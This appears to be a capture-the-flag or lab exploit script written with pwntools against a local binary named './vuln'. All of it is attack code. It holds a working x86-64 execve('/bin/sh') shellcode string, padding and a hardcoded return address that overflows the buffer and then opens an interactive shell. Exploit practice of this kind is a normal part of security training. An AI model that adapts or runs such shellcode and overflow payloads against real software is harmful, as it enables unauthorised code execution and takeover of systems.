from pwn import*

p = process('./vuln')
#gdb.attach(p, api=True)

value = 0x601060
shellcode =  b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
payload = shellcode + b'\x00'*64 + p64(0x0000000000400440) 

p.sendline(payload)
p.interactive()
